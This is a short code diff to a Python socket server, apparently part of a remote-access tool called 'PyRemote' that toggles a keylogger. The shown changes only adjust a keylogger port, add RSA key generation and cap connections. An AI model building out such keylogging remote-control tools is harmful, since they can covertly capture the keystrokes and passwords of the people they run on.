@@ -6,15 +6,28 @@ import cv2 as cv
 import subprocess
 import pickle
 
+
 HEADER = 64 
 PORT = 5000
 SERVER = "127.0.0.1"
-KEYLOGGERADDR = ("127.0.0.1", 5050)
+KEYLOGGERADDR = ("127.0.0.1", 8000)
 ADDR = (SERVER, PORT)
 FORMAT = "utf-8"
 DISCONNECTED_MESSAGE = "DISCONNECT"
+MAXCONNECTIONS = 1
+
 
 MAINFOLDER = "PyRemote/"
+SETTINGSDIR = "PyRemote/settings.pyr"
+
+
+# Initalize
+
+publickey, privatekey = rsa.newkeys(1024)
+encrypted: bool = False
+
+numConnected = 0
+
 
 
 server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -95,7 +108,16 @@ def toggleLogger() -> bytes:
     status: bytes = conn.recv(1024)
     return status
 
+def send():
+    pass
+
+
 def handleConnection(conn: socket, addr):
+    global numConnected
+    if numConnected < MAXCONNECTIONS:
+        numConnected += 1
+    else:
+        pass
     print(f"{addr} has connected!")
     connected = True
     while connected:
